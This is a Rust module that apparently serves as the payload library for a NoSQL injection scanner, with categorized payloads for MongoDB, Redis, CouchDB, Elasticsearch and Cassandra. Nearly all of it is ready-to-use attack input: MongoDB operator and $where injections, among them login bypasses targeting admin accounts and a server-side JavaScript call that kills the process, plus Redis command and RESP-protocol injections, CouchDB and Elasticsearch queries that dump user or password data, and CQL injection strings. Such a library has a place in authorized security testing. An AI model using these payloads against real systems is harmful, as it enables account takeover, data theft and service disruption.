//! NoSQL Injection payload database
//!
//! Contains payloads for various NoSQL databases:
//! - MongoDB (operator injection, JavaScript injection)
//! - Redis (command injection, Lua injection)
//! - CouchDB (view injection, JavaScript injection)
//! - Elasticsearch (query DSL injection)
//! - Cassandra (CQL injection)

#![allow(dead_code)]

use std::fmt;

/// NoSQL database type
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum NoSqlDb {
  /// MongoDB with BSON queries
  MongoDB,
  /// Redis key-value store
  Redis,
  /// CouchDB document store
  CouchDB,
  /// Elasticsearch search engine
  Elasticsearch,
  /// Cassandra wide-column store
  Cassandra,
  /// Generic/unknown NoSQL
  Generic,
}

impl fmt::Display for NoSqlDb {
  fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
    write!(f, "{}", self.as_str())
  }
}

impl NoSqlDb {
  pub fn as_str(&self) -> &'static str {
    match self {
      NoSqlDb::MongoDB => "MongoDB",
      NoSqlDb::Redis => "Redis",
      NoSqlDb::CouchDB => "CouchDB",
      NoSqlDb::Elasticsearch => "Elasticsearch",
      NoSqlDb::Cassandra => "Cassandra",
      NoSqlDb::Generic => "Generic",
    }
  }
}

/// NoSQL injection technique type
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum NoSqlTechnique {
  /// Operator injection ($where, $regex, $gt, etc.)
  OperatorInjection,
  /// JavaScript injection in $where clauses
  JavaScriptInjection,
  /// Authentication bypass via operator manipulation
  AuthBypass,
  /// Command injection (Redis, etc.)
  CommandInjection,
  /// Query DSL manipulation (Elasticsearch)
  QueryDslInjection,
  /// Blind injection via timing/boolean
  BlindInjection,
  /// Data extraction via error messages
  ErrorBased,
}

impl fmt::Display for NoSqlTechnique {
  fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
    write!(f, "{}", self.as_str())
  }
}

impl NoSqlTechnique {
  pub fn as_str(&self) -> &'static str {
    match self {
      NoSqlTechnique::OperatorInjection => "operator-injection",
      NoSqlTechnique::JavaScriptInjection => "javascript-injection",
      NoSqlTechnique::AuthBypass => "auth-bypass",
      NoSqlTechnique::CommandInjection => "command-injection",
      NoSqlTechnique::QueryDslInjection => "query-dsl-injection",
      NoSqlTechnique::BlindInjection => "blind-injection",
      NoSqlTechnique::ErrorBased => "error-based",
    }
  }
}

/// Risk level for payloads
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RiskLevel {
  /// Safe - unlikely to cause issues
  Low = 1,
  /// Moderate - may cause noticeable effects
  Medium = 2,
  /// High - may cause data exposure or modification
  High = 3,
}

/// A NoSQL injection payload
#[derive(Debug, Clone)]
pub struct NoSqlPayload {
  /// The payload string
  pub payload: &'static str,
  /// Target database
  pub database: NoSqlDb,
  /// Injection technique
  pub technique: NoSqlTechnique,
  /// Risk level
  pub risk: RiskLevel,
  /// Description of what this payload does
  pub description: &'static str,
}

// ============================================================================
// MongoDB Payloads
// ============================================================================

/// MongoDB operator injection payloads
pub static MONGODB_OPERATOR_PAYLOADS: &[NoSqlPayload] = &[
  // Basic operator injection
  NoSqlPayload {
    payload: r#"{"$gt": ""}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Greater than empty string - matches all non-empty values",
  },
  NoSqlPayload {
    payload: r#"{"$ne": null}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Not equal to null - matches all documents with field",
  },
  NoSqlPayload {
    payload: r#"{"$ne": ""}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Not equal to empty - matches all non-empty values",
  },
  NoSqlPayload {
    payload: r#"{"$exists": true}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Field exists check - matches all documents with field",
  },
  NoSqlPayload {
    payload: r#"{"$regex": ".*"}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Regex match all - matches any value",
  },
  NoSqlPayload {
    payload: r#"{"$regex": "^a"}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Regex prefix match - for data extraction",
  },
  NoSqlPayload {
    payload: r#"{"$in": [null, "", 0, false]}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Match falsy values",
  },
  NoSqlPayload {
    payload: r#"{"$nin": []}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Not in empty array - matches all",
  },
  // Array operators
  NoSqlPayload {
    payload: r#"{"$size": 0}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Array size zero check",
  },
  NoSqlPayload {
    payload: r#"{"$elemMatch": {"$gt": ""}}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Element match with operator",
  },
  // Type operators
  NoSqlPayload {
    payload: r#"{"$type": 2}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Type check for string (BSON type 2)",
  },
  NoSqlPayload {
    payload: r#"{"$type": "string"}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Type check for string by name",
  },
];

/// MongoDB JavaScript injection payloads
pub static MONGODB_JS_PAYLOADS: &[NoSqlPayload] = &[
  NoSqlPayload {
    payload: r#"{"$where": "1==1"}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::JavaScriptInjection,
    risk: RiskLevel::Medium,
    description: "Always true $where clause",
  },
  NoSqlPayload {
    payload: r#"{"$where": "this.password.length > 0"}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::JavaScriptInjection,
    risk: RiskLevel::Medium,
    description: "Check password field length",
  },
  NoSqlPayload {
    payload: r#"{"$where": "sleep(5000)"}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::JavaScriptInjection,
    risk: RiskLevel::High,
    description: "Time-based blind injection with sleep",
  },
  NoSqlPayload {
    payload: r#"{"$where": "function() { return true; }"}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::JavaScriptInjection,
    risk: RiskLevel::Medium,
    description: "Function returning true",
  },
  NoSqlPayload {
    payload: r#"'; return true; var dummy='"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::JavaScriptInjection,
    risk: RiskLevel::Medium,
    description: "String escape for $where injection",
  },
  NoSqlPayload {
    payload: r#"'; sleep(5000); var dummy='"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::JavaScriptInjection,
    risk: RiskLevel::High,
    description: "Time-based with string escape",
  },
  NoSqlPayload {
    payload: r#"{"$where": "this.constructor.constructor('return process')().exit()"}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::JavaScriptInjection,
    risk: RiskLevel::High,
    description: "Server-side JavaScript RCE attempt (old MongoDB)",
  },
];

/// MongoDB authentication bypass payloads
pub static MONGODB_AUTH_BYPASS: &[NoSqlPayload] = &[
  NoSqlPayload {
    payload: r#"{"username": {"$gt": ""}, "password": {"$gt": ""}}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::AuthBypass,
    risk: RiskLevel::High,
    description: "Bypass with $gt operator on both fields",
  },
  NoSqlPayload {
    payload: r#"{"username": {"$ne": ""}, "password": {"$ne": ""}}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::AuthBypass,
    risk: RiskLevel::High,
    description: "Bypass with $ne operator",
  },
  NoSqlPayload {
    payload: r#"{"username": "admin", "password": {"$gt": ""}}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::AuthBypass,
    risk: RiskLevel::High,
    description: "Target admin with password bypass",
  },
  NoSqlPayload {
    payload: r#"{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::AuthBypass,
    risk: RiskLevel::High,
    description: "Regex match admin with password bypass",
  },
  NoSqlPayload {
    payload: r#"{"$or": [{"username": "admin"}, {"username": "administrator"}], "password": {"$gt": ""}}"#,
    database: NoSqlDb::MongoDB,
    technique: NoSqlTechnique::AuthBypass,
    risk: RiskLevel::High,
    description: "Try multiple admin usernames",
  },
];

// ============================================================================
// Redis Payloads
// ============================================================================

/// Redis command injection payloads
pub static REDIS_PAYLOADS: &[NoSqlPayload] = &[
  // Information gathering
  NoSqlPayload {
    payload: "INFO",
    database: NoSqlDb::Redis,
    technique: NoSqlTechnique::CommandInjection,
    risk: RiskLevel::Low,
    description: "Get server information",
  },
  NoSqlPayload {
    payload: "CONFIG GET *",
    database: NoSqlDb::Redis,
    technique: NoSqlTechnique::CommandInjection,
    risk: RiskLevel::Medium,
    description: "Get all configuration",
  },
  NoSqlPayload {
    payload: "KEYS *",
    database: NoSqlDb::Redis,
    technique: NoSqlTechnique::CommandInjection,
    risk: RiskLevel::Medium,
    description: "List all keys",
  },
  NoSqlPayload {
    payload: "DBSIZE",
    database: NoSqlDb::Redis,
    technique: NoSqlTechnique::CommandInjection,
    risk: RiskLevel::Low,
    description: "Get database size",
  },
  // Data extraction
  NoSqlPayload {
    payload: "GET *",
    database: NoSqlDb::Redis,
    technique: NoSqlTechnique::CommandInjection,
    risk: RiskLevel::Medium,
    description: "Attempt to get all values",
  },
  NoSqlPayload {
    payload: "SCAN 0 MATCH * COUNT 100",
    database: NoSqlDb::Redis,
    technique: NoSqlTechnique::CommandInjection,
    risk: RiskLevel::Medium,
    description: "Scan keys with pattern",
  },
  // Dangerous operations
  NoSqlPayload {
    payload: "EVAL \"return redis.call('keys','*')\" 0",
    database: NoSqlDb::Redis,
    technique: NoSqlTechnique::CommandInjection,
    risk: RiskLevel::High,
    description: "Lua script to list keys",
  },
  NoSqlPayload {
    payload: "DEBUG SLEEP 5",
    database: NoSqlDb::Redis,
    technique: NoSqlTechnique::BlindInjection,
    risk: RiskLevel::High,
    description: "Time-based detection via DEBUG SLEEP",
  },
  // RESP protocol injection
  NoSqlPayload {
    payload: "*1\r\n$4\r\nINFO\r\n",
    database: NoSqlDb::Redis,
    technique: NoSqlTechnique::CommandInjection,
    risk: RiskLevel::Medium,
    description: "RESP protocol INFO command",
  },
  NoSqlPayload {
    payload: "*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n",
    database: NoSqlDb::Redis,
    technique: NoSqlTechnique::CommandInjection,
    risk: RiskLevel::Medium,
    description: "RESP protocol KEYS command",
  },
];

// ============================================================================
// CouchDB Payloads
// ============================================================================

/// CouchDB injection payloads
pub static COUCHDB_PAYLOADS: &[NoSqlPayload] = &[
  NoSqlPayload {
    payload: r#"{"selector": {"_id": {"$gt": null}}}"#,
    database: NoSqlDb::CouchDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Low,
    description: "Select all documents with Mango query",
  },
  NoSqlPayload {
    payload: r#"{"selector": {"password": {"$regex": "^a"}}}"#,
    database: NoSqlDb::CouchDB,
    technique: NoSqlTechnique::OperatorInjection,
    risk: RiskLevel::Medium,
    description: "Regex extraction of password prefix",
  },
  NoSqlPayload {
    payload: "/_all_docs?include_docs=true",
    database: NoSqlDb::CouchDB,
    technique: NoSqlTechnique::QueryDslInjection,
    risk: RiskLevel::Medium,
    description: "List all documents",
  },
  NoSqlPayload {
    payload: "/_users/_all_docs",
    database: NoSqlDb::CouchDB,
    technique: NoSqlTechnique::QueryDslInjection,
    risk: RiskLevel::High,
    description: "List all users",
  },
  NoSqlPayload {
    payload: r#"{"map": "function(doc) { emit(doc._id, doc); }"}"#,
    database: NoSqlDb::CouchDB,
    technique: NoSqlTechnique::JavaScriptInjection,
    risk: RiskLevel::Medium,
    description: "Create view to extract all documents",
  },
];

// ============================================================================
// Elasticsearch Payloads
// ============================================================================

/// Elasticsearch query injection payloads
pub static ELASTICSEARCH_PAYLOADS: &[NoSqlPayload] = &[
  NoSqlPayload {
    payload: r#"{"query": {"match_all": {}}}"#,
    database: NoSqlDb::Elasticsearch,
    technique: NoSqlTechnique::QueryDslInjection,
    risk: RiskLevel::Low,
    description: "Match all documents",
  },
  NoSqlPayload {
    payload: r#"{"query": {"wildcard": {"_all": "*"}}}"#,
    database: NoSqlDb::Elasticsearch,
    technique: NoSqlTechnique::QueryDslInjection,
    risk: RiskLevel::Medium,
    description: "Wildcard match all fields",
  },
  NoSqlPayload {
    payload: r#"{"query": {"bool": {"must_not": {"exists": {"field": "_nonexistent"}}}}}"#,
    database: NoSqlDb::Elasticsearch,
    technique: NoSqlTechnique::QueryDslInjection,
    risk: RiskLevel::Low,
    description: "Match all via negation of impossible condition",
  },
  NoSqlPayload {
    payload: "/_cat/indices",
    database: NoSqlDb::Elasticsearch,
    technique: NoSqlTechnique::QueryDslInjection,
    risk: RiskLevel::Medium,
    description: "List all indices",
  },
  NoSqlPayload {
    payload: "/_mapping",
    database: NoSqlDb::Elasticsearch,
    technique: NoSqlTechnique::QueryDslInjection,
    risk: RiskLevel::Medium,
    description: "Get all mappings",
  },
  NoSqlPayload {
    payload: "/_cluster/health",
    database: NoSqlDb::Elasticsearch,
    technique: NoSqlTechnique::QueryDslInjection,
    risk: RiskLevel::Low,
    description: "Get cluster health",
  },
  NoSqlPayload {
    payload: r#"{"script": {"source": "ctx._source.password"}}"#,
    database: NoSqlDb::Elasticsearch,
    technique: NoSqlTechnique::JavaScriptInjection,
    risk: RiskLevel::High,
    description: "Painless script injection for data access",
  },
];

// ============================================================================
// Cassandra CQL Payloads
// ============================================================================

/// Cassandra CQL injection payloads
pub static CASSANDRA_PAYLOADS: &[NoSqlPayload] = &[
  NoSqlPayload {
    payload: "' OR '1'='1",
    database: NoSqlDb::Cassandra,
    technique: NoSqlTechnique::AuthBypass,
    risk: RiskLevel::Medium,
    description: "Basic CQL injection",
  },
  NoSqlPayload {
    payload: "' ALLOW FILTERING--",
    database: NoSqlDb::Cassandra,
    technique: NoSqlTechnique::QueryDslInjection,
    risk: RiskLevel::Medium,
    description: "Allow filtering bypass",
  },
  NoSqlPayload {
    payload: "'; SELECT * FROM system.local--",
    database: NoSqlDb::Cassandra,
    technique: NoSqlTechnique::QueryDslInjection,
    risk: RiskLevel::Medium,
    description: "System table extraction",
  },
  NoSqlPayload {
    payload: "' AND token(id) > token('')--",
    database: NoSqlDb::Cassandra,
    technique: NoSqlTechnique::QueryDslInjection,
    risk: RiskLevel::Medium,
    description: "Token-based bypass",
  },
];

// ============================================================================
// Helper Functions
// ============================================================================

/// Get all payloads for a specific database
pub fn payloads_for_db(db: NoSqlDb) -> Vec<&'static NoSqlPayload> {
  let mut payloads = Vec::new();

  match db {
    NoSqlDb::MongoDB => {
      payloads.extend(MONGODB_OPERATOR_PAYLOADS.iter());
      payloads.extend(MONGODB_JS_PAYLOADS.iter());
      payloads.extend(MONGODB_AUTH_BYPASS.iter());
    }
    NoSqlDb::Redis => {
      payloads.extend(REDIS_PAYLOADS.iter());
    }
    NoSqlDb::CouchDB => {
      payloads.extend(COUCHDB_PAYLOADS.iter());
    }
    NoSqlDb::Elasticsearch => {
      payloads.extend(ELASTICSEARCH_PAYLOADS.iter());
    }
    NoSqlDb::Cassandra => {
      payloads.extend(CASSANDRA_PAYLOADS.iter());
    }
    NoSqlDb::Generic => {
      // Return all payloads
      payloads.extend(MONGODB_OPERATOR_PAYLOADS.iter());
      payloads.extend(MONGODB_JS_PAYLOADS.iter());
      payloads.extend(MONGODB_AUTH_BYPASS.iter());
      payloads.extend(REDIS_PAYLOADS.iter());
      payloads.extend(COUCHDB_PAYLOADS.iter());
      payloads.extend(ELASTICSEARCH_PAYLOADS.iter());
      payloads.extend(CASSANDRA_PAYLOADS.iter());
    }
  }

  payloads
}

/// Get payloads for a specific technique
pub fn payloads_by_technique(technique: NoSqlTechnique) -> Vec<&'static NoSqlPayload> {
  let all = payloads_for_db(NoSqlDb::Generic);
  all
    .into_iter()
    .filter(|p| p.technique == technique)
    .collect()
}

/// Get payloads by risk level
pub fn payloads_by_risk(max_risk: RiskLevel) -> Vec<&'static NoSqlPayload> {
  let all = payloads_for_db(NoSqlDb::Generic);
  all.into_iter().filter(|p| p.risk <= max_risk).collect()
}

/// Get total count of all payloads
pub fn total_payload_count() -> usize {
  MONGODB_OPERATOR_PAYLOADS.len()
    + MONGODB_JS_PAYLOADS.len()
    + MONGODB_AUTH_BYPASS.len()
    + REDIS_PAYLOADS.len()
    + COUCHDB_PAYLOADS.len()
    + ELASTICSEARCH_PAYLOADS.len()
    + CASSANDRA_PAYLOADS.len()
}

#[cfg(test)]
mod tests {
  use super::*;

  #[test]
  fn test_payload_counts() {
    assert!(MONGODB_OPERATOR_PAYLOADS.len() >= 10);
    assert!(MONGODB_JS_PAYLOADS.len() >= 5);
    assert!(MONGODB_AUTH_BYPASS.len() >= 3);
    assert!(REDIS_PAYLOADS.len() >= 8);
    assert!(total_payload_count() >= 40);
  }

  #[test]
  fn test_payloads_for_db() {
    let mongo = payloads_for_db(NoSqlDb::MongoDB);
    assert!(mongo.len() >= 20);

    let redis = payloads_for_db(NoSqlDb::Redis);
    assert!(redis.len() >= 5);
  }

  #[test]
  fn test_payloads_by_technique() {
    let auth = payloads_by_technique(NoSqlTechnique::AuthBypass);
    assert!(auth.len() >= 5);
  }
}
